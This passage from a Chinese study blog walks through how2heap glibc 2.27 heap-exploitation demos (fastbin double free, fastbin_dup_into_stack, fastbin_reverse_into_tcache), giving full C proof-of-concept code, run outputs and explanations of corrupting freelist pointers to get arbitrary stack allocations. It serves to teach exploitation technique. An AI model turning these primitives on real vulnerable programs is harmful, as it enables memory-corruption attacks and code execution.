<p>因为有tcache的存在，想使用fastbin attack都需要先填满对应的tcache。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/1.png"></p>
<p>创建三个chunk(a, b, c)使用的是calloc，而calloc不会从tcache中取。接着释放a，因为对应的tcache被填满了，所以a会进入fastbin。</p>
<p>同理b也会进入fastbin，再次释放a之后，就会形成double free。形成的原理还是因为fastbin中只检测了上一个和下一个。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/2.png"></p>
<p>申请abc此时通过fastbin的分配原理，a = c。利用就比2.23多了一个填满tcache。</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Fill up tcache first.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st calloc(1, 8): 0x55555555b360</span><br><span class="line">2nd calloc(1, 8): 0x55555555b380</span><br><span class="line">3rd calloc(1, 8): 0x55555555b3a0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x55555555b360 again, things will crash because 0x55555555b360 is at the top of the free list.</span><br><span class="line">So, instead, we'll free 0x55555555b380.</span><br><span class="line">Now, we can free 0x55555555b360 again, since it's not the head of the free list.</span><br><span class="line">Now the free list has [ 0x55555555b360, 0x55555555b380, 0x55555555b360 ]. If we malloc 3 times, we'll get 0x55555555b360 twice!</span><br><span class="line">1st calloc(1, 8): 0x55555555b360</span><br><span class="line">2nd calloc(1, 8): 0x55555555b380</span><br><span class="line">3rd calloc(1, 8): 0x55555555b360</span><br></pre></td></tr></tbody></table></figure>

<h3 id="fastbin-dup-into-stack-分配到栈上"><a href="#fastbin-dup-into-stack-分配到栈上" class="headerlink" title="fastbin_dup_into_stack(分配到栈上)"></a>fastbin_dup_into_stack(分配到栈上)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking calloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Fill up tcache first.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want calloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st calloc(1,8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd calloc(1,8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd calloc(1,8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st calloc(1,8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd calloc(1,8): %p\n"</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that calloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd calloc(1,8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th calloc(1,8): %p\n"</span>, p);</span><br><span class="line">	assert(p == <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line">	<span class="comment">// assert((long)__builtin_return_address(0) == *(long *)p);</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>因为还是fastbin attack所以我们需要填满tcache。</p>
<p>接着使用calloc申请三个一样大小size的堆块，释放掉形成doble free。过程和上面的一样。</p>
<p>申请d，此时d就为a的那一块地址，再申请一次同大小的堆，此时的地址为b的地址。将d的fd改成栈上的一个伪造的堆那里，再申请两次就可以分配到目标地址。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/3.png"></p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking calloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">Fill up tcache first.</span><br><span class="line">The address we want calloc() to return is 0x7fffffffdcc0.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st calloc(1,8): 0x55555555b340</span><br><span class="line">2nd calloc(1,8): 0x55555555b360</span><br><span class="line">3rd calloc(1,8): 0x55555555b380</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x55555555b340 again, things will crash because 0x55555555b340 is at the top of the free list.</span><br><span class="line">So, instead, we'll free 0x55555555b360.</span><br><span class="line">Now, we can free 0x55555555b340 again, since it's not the head of the free list.</span><br><span class="line">Now the free list has [ 0x55555555b340, 0x55555555b360, 0x55555555b340 ]. We'll now carry out our attack by modifying data at 0x55555555b340.</span><br><span class="line">1st calloc(1,8): 0x55555555b340</span><br><span class="line">2nd calloc(1,8): 0x55555555b360</span><br><span class="line">Now the free list has [ 0x55555555b340 ].</span><br><span class="line">Now, we have access to 0x55555555b340 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that calloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x55555555b340 to point right before the 0x20.</span><br><span class="line">3rd calloc(1,8): 0x55555555b340, putting the stack address on the free list</span><br><span class="line">4th calloc(1,8): 0x7fffffffdcc0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span></span><br><span class="line">    <span class="string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span></span><br><span class="line">    <span class="string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span></span><br><span class="line">    <span class="string">"a large unsigned value to the stack.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) {</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) {</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) {</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The stack address that we intend to target: %p\n"</span></span><br><span class="line">    <span class="string">"It's current value is %p\n"</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span></span><br><span class="line">    <span class="string">"to overwrite the next pointer at address %p\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) {</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">    <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">    <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">    <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">    <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">    <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">    <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">    <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">    <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">    <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">    <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>分配14个0x40大小的堆块，并将tcache先填满。再将剩余的给放入fastbin中。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/4.png"></p>
<p>修改第一个放入fastbin中的chunk的fd为目标地址</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/5.png"></p>
<p>将tcache清空，再申请的时候会从fastbin中取。然后将fastbin的chunk放入tcache中。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.27/6.png"></p>
<p>再申请的时候就会取出target的地址，实现任意地址申请。</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">This attack is intended to have a similar effect to the unsorted_bin_attack,</span><br><span class="line">except it works with a small allocation size (allocsize &lt;= 0x78).</span><br><span class="line">The goal is to set things up so that a call to malloc(allocsize) will write</span><br><span class="line">a large unsigned value to the stack.</span><br><span class="line"></span><br><span class="line">First we need to free(allocsize) at least 7 times to fill the tcache.</span><br><span class="line">(More than 7 times works fine too.)</span><br><span class="line"></span><br><span class="line">The next pointer that we free is the chunk that we're going to corrupt: 0x55555555b490</span><br><span class="line">It doesn't matter if we corrupt it now or later. Because the tcache is</span><br><span class="line">already full, it will go in the fastbin.</span><br><span class="line"></span><br><span class="line">Next we need to free between 1 and 6 more pointers. These will also go</span><br><span class="line">in the fastbin. If the stack address that we want to overwrite is not zero</span><br><span class="line">then we need to free exactly 6 more pointers, otherwise the attack will</span><br><span class="line">cause a segmentation fault. But if the value on the stack is zero then</span><br><span class="line">a single free is sufficient.</span><br><span class="line"></span><br><span class="line">The stack address that we intend to target: 0x7fffffffdc70</span><br><span class="line">It's current value is 0xcdcdcdcdcdcdcdcd</span><br><span class="line">Now we use a vulnerability such as a buffer overflow or a use-after-free</span><br><span class="line">to overwrite the next pointer at address 0x55555555b490</span><br><span class="line"></span><br><span class="line">The next step is to malloc(allocsize) 7 times to empty the tcache.</span><br><span class="line"></span><br><span class="line">Let's just print the contents of our array on the stack now,</span><br><span class="line">to show that it hasn't been modified yet.</span><br><span class="line"></span><br><span class="line">0x7fffffffdc60: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc68: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc70: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc78: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc80: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7fffffffdc88: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">The next allocation triggers the stack to be overwritten. The tcache</span><br><span class="line">is empty, but the fastbin isn't, so the next allocation comes from the</span><br><span class="line">fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.</span><br><span class="line">Those 7 chunks are copied in reverse order into the tcache, so the stack</span><br><span class="line">address that we are targeting ends up being the first chunk in the tcache.</span><br><span class="line">It contains a pointer to the next chunk in the list, which is why a heap</span><br><span class="line">pointer is written to the stack.</span><br><span class="line"></span><br><span class="line">Earlier we said that the attack will also work if we free fewer than 6</span><br><span class="line">extra pointers to the fastbin, but only if the value on the stack is zero.</span><br><span class="line">That's because the value on the stack is treated as a next pointer in the</span><br><span class="line">linked list and it will trigger a crash if it isn't a valid pointer or null.</span><br><span class="line"></span><br><span class="line">The contents of our array on the stack now look like this:</span><br><span class="line"></span><br><span class="line">0x7fffffffdc60: 0xcdcdcdcdcdcdcdcd</span><br><span 